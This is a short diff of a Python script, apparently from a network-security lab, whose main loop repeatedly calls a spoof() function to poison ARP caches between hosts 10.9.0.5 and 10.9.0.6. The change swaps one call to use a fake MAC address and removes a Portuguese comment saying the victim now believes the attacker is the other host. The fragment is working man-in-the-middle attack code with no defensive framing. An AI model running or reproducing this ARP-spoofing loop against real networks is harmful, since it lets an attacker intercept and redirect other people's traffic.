@@ -23,8 +23,7 @@ def main():
    mac = get_localmac()
    while True:
       spoof(mac, "10.9.0.6", "10.9.0.5")
-      spoof(mac, "10.9.0.5", "10.9.0.6")
-   # print(f'Pacote ARP enviado! 10.9.0.5 agora acha que somos o 10.9.0.6!')
+      spoof("ff:ff:ff:ff:ff:aa", "10.9.0.5", "10.9.0.6")
 
 if __name__ == "__main__":
    main()
